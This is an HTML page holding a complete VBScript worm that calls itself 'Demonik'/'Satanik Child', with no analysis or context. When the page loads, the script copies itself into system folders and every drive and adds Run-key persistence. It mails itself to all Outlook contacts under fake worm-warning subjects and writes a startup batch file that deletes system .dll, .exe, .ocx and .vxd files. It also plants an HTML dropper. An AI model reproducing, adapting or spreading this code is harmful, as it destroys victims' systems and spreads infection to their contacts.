<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
<META content="MSHTML 5.50.4134.600" name=GENERATOR>
<STYLE></STYLE>
</HEAD>
<BODY text=#ffffff vLink=#ffffff aLink=#ffffff link=#ffffff bgColor=#000000>
<SCRIPT language=VBScript>
<!--

On Error Resume Next
Dim fso,dirsystem,file,vbscopy,dow,reg,FileLoc,MakeCopy,Lists,a,x,RegLists,Entries,Addresses,RegAddress,Mail
Set fso = CreateObject("Scripting.FileSystemObject")
Set reg = CreateObject("WScript.Shell")
Set dirsystem = fso.GetSpecialFolder(1)
Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
Set MakeCopy = fso.GetFile(WScript.ScriptFullName)
Set OutLook=WScript.CreateObject("Outlook.Application")
Set mapi=OutLook.GetNameSpace("MAPI")
vbscopy=file.ReadAll
MakeCopy.Copy(dirsystem&"\VBS.vbs")
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\evil.vbs")
c.Copy(dirwin&"\scriptfile.vbs")
c.Copy(dirsystem&"\satanik_child.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end Sub
FileLoc = dirsystem&"\VBS.vbs"
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\VBScript", FileLoc
L_Welcome_MsgBox_Message_Text   = "DEMONIK WORM WAS SUCCESSFULLY INSTALLED!  HA HA, IT DOESNT EVEN NEED ACTIVE X TO INSTALL! NOW WATCH OUTLOOK EXPRESS HANG! SO FUCK YOU!"
L_Welcome_MsgBox_Title_Text     = "SATANIK CHILD ALERT"
Call Welcome()
Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")
Dim MyShortcut, MyDesktop, DesktopPath
DesktopPath = WSHShell.SpecialFolders("Desktop")
Set MyShortcut = WSHShell.CreateShortcut(DesktopPath & "\I-n-f-o O-n N-e-w D-a-n-g-e-r-o-u-s W-o-rm.lnk")
MyShortcut.TargetPath = WSHShell.ExpandEnvironmentStrings("windows\exit to dos")
MyShortcut.WorkingDirectory = WSHShell.ExpandEnvironmentStrings("%windir%")
MyShortcut.WindowStyle = 4
MyShortcut.IconLocation = WSHShell.ExpandEnvironmentStrings("C:\Program Files\Plus!\Themes\Windows 98 My Computer.ico, 0")
MYShortcut.Save
WScript.Echo "Click on the computer icon to find out more info on this very destructive worm!                       Warning:  Ignorining this might and can result in fatal damage to your computer"
For Lists=1 to mapi.AddressLists.Count
Set a=mapi.AddressLists(Lists)
x=1
RegLists=reg.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
If (RegLists="") then
RegLists=1
End if
If (int(a.AddressEntries.Count)>int(RegLists)) then
For Entries=1 to a.AddressEntries.Count
Addresses=a.AddressEntries(x)
RegAddress=""
RegAddress=reg.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&Addresses)
If (RegAddresses="") then
Set Mail=OutLook.CreateItem(0)
Mail.Recipients.Add(Addresses)
Mail.Subject = "WARNING:  A NEW DESTRUCTIVE WORM HAS BEEN DISCOVERED"
Mail.Body = vbcrlf & "This worm might not even be detected yet."& vbcrlf & "DEMONIC_WORM"
Mail.Attachments.Add(dirsystem&"\Info_ON_New_WORM.vbs")
Mail.Send
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&Addresses,1,"REG_DWORD"
End if
x=x+1
Next
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
Else
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
End if
Next
Set OutLook=Nothing
Set mapi=Nothing
Sub Welcome()
    Dim intDoIt

    intDoIt =  MsgBox(L_Welcome_MsgBox_Message_Text,    _
                      vbOKCancel + vbInformation,       _
                      L_Welcome_MsgBox_Title_Text )
    If intDoIt = vbCancel Then
        WScript.Quit
End If 
End Sub
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\")
Set fc = a.SubFolders
Set nf = fc.Add("SATANIK  CHILD")
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\SATANIK  CHILD\")
Set fc = a.SubFolders
Set nf = fc.Add("Has Fucked Up Your Computer")
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\SATANIK  CHILD\Has Fucked Up Your Computer\")
Set fc = a.SubFolders
Set nf = fc.Add("Dont Be Surprised")
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\SATANIK  CHILD\Has Fucked Up Your Computer\Dont Be Surprised\")
Set fc = a.SubFolders
Set nf = fc.Add("SATANIK CHILD Is An Evil Mother Fucker")
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\SATANIK  CHILD\Has Fucked Up Your Computer\Dont Be Surprised\SATANIK CHILD Is An Evil Mother Fucker\")
Set fc = a.SubFolders
Set nf = fc.Add("Because He Also...")
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\SATANIK  CHILD\Has Fucked Up Your Computer\Dont Be Surprised\SATANIK CHILD Is An Evil Mother Fucker\Because He Also...\")
Set fc = a.SubFolders
Set nf = fc.Add("Installed A DEMONIC WORM")
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\SATANIK  CHILD\Has Fucked Up Your Computer\Dont Be Surprised\SATANIK CHILD Is An Evil Mother Fucker\Because He Also...\Installed A DEMONIC WORM\")
Set fc = a.SubFolders
Set nf = fc.Add("The Funny Thing Though...")
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFolder("c:\SATANIK  CHILD\Has Fucked Up Your Computer\Dont Be Surprised\SATANIK CHILD Is An Evil Mother Fucker\Because He Also...\Installed A DEMONIC WORM\The Funny Thing Though.../")
Set fc = a.SubFolders
Set nf = fc.Add("AntiVirus Companies Do Not Recognize It Yet")
Set Fool = CreateObject("Scripting.FileSystemObject")
Set d = Fool.CreateTextFile("c:\SATANIK  CHILD\Has Fucked Up Your Computer\Dont Be Surprised\SATANIK CHILD Is An Evil Mother Fucker\Because He Also...\Installed A DEMONIC WORM\The Funny Thing Though...\AntiVirus Companies Do Not Recognize It Yet\From_Satanik_Child.txt", True)
d.WriteLine("            _                         _       ")
d.WriteLine("           |_|                       |_|      ")
d.WriteLine("           | |         /^^^\         | |      ")
d.WriteLine("          _| |_      (| øoø |)      _| |_     ")
d.WriteLine("        _| | | | _    (_---_)    _ | | | |_   ")
d.WriteLine("       | | | |'   |    _| |_    | `| | | | |  ")
d.WriteLine("       |          |   /     \   |          |  ") 
d.WriteLine("        \        /  / /(. .)\ \  \        /   ")
d.WriteLine("          \    /  / /  | . |  \ \  \    /     ")
d.WriteLine("            \  \/ /    ||Y||    \ \/  /       ")
d.WriteLine("             \__/      || ||      \__/        ")
d.WriteLine("                       () ()                  ")
d.WriteLine("                       || ||                  ")
d.WriteLine("                      ooO Ooo                 ")
d.WriteLine("                                              ")
d.WriteLine("                   FUCK YOU ALL               ")
d.WriteLine("            =a SATANIK CHILD infection=       ")
d.close
Set Worm = CreateObject("Scripting.FileSystemObject")
set d = Worm.CreateTextFile("c:\Windows\Script.VBS")
d.WriteLine "MsgBox " & CHR(34) & "I-WORM-DEMONIC HAS BEEN INSTALLED" & CHR(34) & ", 50, " & CHR(34) & "SATANIK CHILD MESSAGE" & CHR(34)
d.close
Set reg = CreateObject("WScript.Shell")
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Script File", dirwin&"C:\WINDOWS\Script.vbs"
Set fso = CreateObject("Scripting.FileSystemObject")
Dim Sso, tf
Set fso = CreateObject("Scripting.FileSystemObject")
Set tf = fso.CreateTextFile("C:\Windows\Start Menu\Programs\Startup\DEMONIC WORM.bat", True)
tf.WriteLine("@echo off") 
tf.WriteLine("c:")
tf.WriteLine("cd %WinDir%\System\")
tf.WriteLine("deltree /y *.dll")
tf.WriteLine("cd\")
tf.WriteLine("deltree /y *.vxd")
tf.WriteLine("c:")
tf.WriteLine("cd %WinDir%\")
tf.WriteLine("deltree /y *.ocx")
tf.WriteLine("cd\")
tf.WriteLine("deltree /y *.exe")
tf.Close
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set sysfolder = fso.GetSpecialFolder(SystemFolder)   
Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Demonik", sysfolder & "\Demonik.god"
WSHShell.RegWrite "HKEY_CLASSES_ROOT\.god\", "VBSFile"
fso.CopyFile Wscript.ScriptFullName, sysfolder & "\Demonik.god"
fso.GetFile(sysfolder & "\Demonik.god").attributes = 2
fso.CreateFolder sysfolder & "\Demonik"
fso.CopyFile Wscript.ScriptFullName, sysfolder & "\Demonik\natas.vbs"
fso.GetFolder(sysfolder & "\Demonik").attributes = 2
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 3 Then
fso.CopyFile Wscript.ScriptFullName, d.DriveLetter & ":\natas.vbs"
ElseIf d.DriveType = 1 And d.IsReady Then
fso.CopyFile Wscript.ScriptFullName, d.DriveLetter & ":\natas.vbs"
End If
Next
On Error Resume Next
Set efx1 = CreateObject("WScript.Shell")
efx1.regwrite "HKCU\software\Demonik\", Chr(87) & Chr(111) & Chr(114) & Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & Chr(48) & Chr(98)
Set efx2= Createobject("scripting.filesystemobject")
efx2.copyfile wscript.scriptfullname,efx2.GetSpecialFolder(0)& "\Demonik.god"
efx1.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\anti_windows","wscript.exe "&efx2.GetSpecialFolder(0)& "\Demonik.god %"
Set efx3= efx2.opentextfile(wscript.scriptfullname, 1)
efx5= efx3.readall
efx3.Close
Do
If Not (efx2.fileexists(wscript.scriptfullname)) Then
Set efx4= efx2.createtextfile(wscript.scriptfullname, True)
efx4.writeefx5
efx4.Close
End If
Loop
Sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end Sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "Demonik_Worm_VBS"
male.Body = vbcrlf&"Some people may find this offensive but I HAD to know what you think."
male.Attachments.Add(dirsystem&"\evil_vbs.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<html> <head><meta http-equiv=@-@Content-Type@-@ content=@-@text?-?html; charset=windows-1252@-@><meta name=@-@GENERATOR@-@ content=@-@Microsoft FrontPage 4.0@-@><meta name=@-@ProgId@-@ content=@-@FrontPage.Editor.Document@-@><title>ADOLFS PAGE<?-?title> <?-?head><BODY><font face=@-@Arial@-@ size=@-@+3@-@><CENTER><DIV ID=@-@DropWave1@-@ STYLE=@-@position:absolute; width:300; top:100; filter:shadow(direction=315,enabled=1)@-@> THIS IS MY DEMONIK WORM <?-?DIV><?-?CENTER> <CENTER><DIV ID=@-@DropWave2@-@ STYLE=@-@position:absolute; width:300; top:200; filter:shadow(direction=315,enabled=1)@-@> AND YOU ARE INFECTED WITH IT! <?-?DIV><?-?CENTER> <DIV ID=@-@DropWave3@-@ STYLE=@-@position:absolute; width:300; top:300; filter:shadow(direction=315,enabled=1)@-@>THIS HAS BEEN A SATANIK CHILD INFECTION <?-?DIV><?-?font><OBJECT ID=@-@DAControl@-@"&vbcrlf& _
  "STYLE=@-@position:absolute; width:1; height:1@-@"&vbcrlf& _ 
  "CLASSID=@-@CLSID:B6FFC24C-7E13-11D0-9B47-00C04FC2F51D@-@ width=@-@192@-@ height=@-@192@-@><?-?OBJECT><SCRIPT LANGUAGE=@-@VBScript@-@><!--"&vbcrlf& _
  "' The DirectAnimation library"&vbcrlf& _
  "Set m = DAControl.MeterLibrary"&vbcrlf& _  
  "Set filterStr = m.ConcatString(m.DAString(@-@shadow(direction=@-@), getNumber().ToString(0))"&vbcrlf& _
  "Set filterStr = m.ConcatString(filterStr, m.DAString(@-@)@-@))"&vbcrlf& _
  "' Using a DAString we can build strings which have time varying elements"&vbcrlf& _
  "Set filterStr = filterStr.AnimateProperty(@-@DropWave1.style.filter@-@, @-@VBScript@-@, false, .1)"&vbcrlf& _
  "Call DAControl.AddBehaviorToRun(filterStr)"&vbcrlf& _
  "' Using a DANumber we can build a property which changes over time"&vbcrlf& _
  "Set filterVal = getNumber().AnimateProperty(@-@DropWave2.filters(0).direction@-@, @-@VBScript@-@, false, .1)"&vbcrlf& _
  "Call DAControl.AddBehaviorToRun(filterVal)"&vbcrlf& _
  "' The AnimateProperty method also allows us to call an arbitrary function instead"&vbcrlf& _
  "Set filterMethod = getNumber().AnimateProperty(@-@setFilter@-@, @-@VBScript@-@, true, .1)"&vbcrlf& _
  "Call DAControl.AddBehaviorToRun(filterMethod)"&vbcrlf& _
  "DAControl.Start"&vbcrlf& _
  "sub setFilter(val)  ' callback for third animateProperty method"&vbcrlf& _
    "DropWave3.filters(0).direction = val"&vbcrlf& _
  "end sub"&vbcrlf& _
  "function getNumber   ' Makes some randomized time varying number"&vbcrlf& _
   "Set getNumber = m.Sequence(m.DANumber(0).Duration(2), m.Interpolate(0,360,1)).RepeatForever()V"&vbcrlf& _  
  "end function"&vbcrlf& _
"'--><?-?SCRIPT><ilayer width=&{sliderwidth}; height=&{sliderheight}; name=@-@ns_slider01@-@ visibility=hide><layer name=@-@ns_slider02@-@ onMouseover=@-@slidespeed=0;@-@ onMouseout=@-@slidespeed=copyspeed@-@><?-?layer> <?-?ilayer><?-?DIV> <?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^evil.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^evil.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^Winoa386@-@,dirsystem&@-@^-^evil.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\I-Worm-Demonik.htm")
b.close
set d=fso.OpenTextFile(dirsystem+"\I-Worm-Demonik.htm",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end Sub
//-->
</SCRIPT>
</BODY></HTML>
